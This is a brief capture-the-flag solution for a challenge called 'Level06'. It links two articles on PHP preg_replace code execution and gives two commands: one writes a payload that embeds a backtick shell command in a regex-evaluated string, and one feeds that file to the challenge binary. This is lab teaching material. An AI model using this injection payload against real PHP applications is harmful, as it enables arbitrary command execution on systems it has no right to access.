
# Level06

<https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4>
<https://ik0nw.github.io/2020/09/23/PHP::Preg_replace()-RCE/>

```bash
echo '[x ${`getflag`} ]' > /tmp/getflag
```

```bash
./level06 /tmp/getflag
```
